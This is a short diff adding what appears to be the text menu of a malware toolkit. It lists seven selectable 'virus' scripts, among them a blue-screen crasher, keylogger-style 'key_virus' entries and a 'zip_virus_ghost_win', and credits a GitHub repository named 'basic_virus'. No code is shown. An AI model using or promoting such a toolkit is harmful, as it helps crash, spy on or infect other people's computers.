@@ -1,0 +1,10 @@
+
+[*]All the Script
+1.blue_screen_script        Enter:use 1
+2.file script               Enter:use 2
+3.key_virus                 Enter:use 3
+4.win_virus                 Enter:use 4
+5.window_virus              Enter:use 5
+6.key_virus_plus            Enter:use 6
+7.zip_virus_ghost_win       Enter:use 7
+Attack_Script from:https://github.com/LinWin-Cloud/basic_virus
